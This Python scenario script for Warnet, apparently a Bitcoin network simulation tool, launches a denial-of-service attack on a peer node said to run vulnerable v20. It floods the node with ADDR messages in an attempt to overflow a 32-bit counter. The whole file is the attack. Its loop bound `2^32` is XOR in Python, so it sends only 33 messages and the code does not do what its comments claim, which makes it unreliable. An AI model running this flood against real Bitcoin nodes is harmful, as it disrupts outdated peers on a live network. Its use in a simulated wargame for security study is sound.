#!/usr/bin/env python3

import time
import socket

# The base class exists inside the commander container when deployed,
# but requires a relative path inside the python source code for other functions.
try:
    from commander import Commander
except ImportError:
    from resources.scenarios.commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import hash256, msg_addr, CAddress
from test_framework.p2p import MAGIC_BYTES, P2PInterface, P2P_SERVICES

def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]

class AddrSpam(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = "Spam target node with ADDR messages to overflow 2^32 counter"
        parser.usage = "warnet run /path/to/addr_spam.py"

    # Scenario entrypoint
    def run_test(self):
        self.log.info("Getting peer info")

        # We'll use 4 as an attacker because we're already connected to 8.
        peerinfo = self.nodes[4].getpeerinfo()
        for peer in peerinfo:
            self.log.info(f"{peer['addr']} {peer['subver']}")

        # Attack node 8 because they're running vulnerable v20.
        victim = peerinfo[8]

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        if ":" in victim["addr"]:
            dstaddr = victim["addr"].split(":")[0]
        else:
            dstaddr = socket.gethostbyname(victim["addr"])
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {dstaddr}:{dstport}")
        attacker = P2PInterface()
        attacker.peer_connect(dstaddr=dstaddr, dstport=dstport, net=chain, timeout_factor=1)()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        # Now we'll send a spam of addr messages!
        self.log.info("Sending addr messages")
        for i in range (1, 2^32):
            self.log.info(f"Sent addr message: {i}")
            msg = msg_addr()

            addr = CAddress()
            addr.time = int(time.time()) + i
            addr.port = 8333
            addr.nServices = P2P_SERVICES
            addr.ip = f"123.123.123.{i % 256}"
            msg.addrs = [addr]

            attacker.send_message(msg)

if __name__ == "__main__":
    AddrSpam().main()
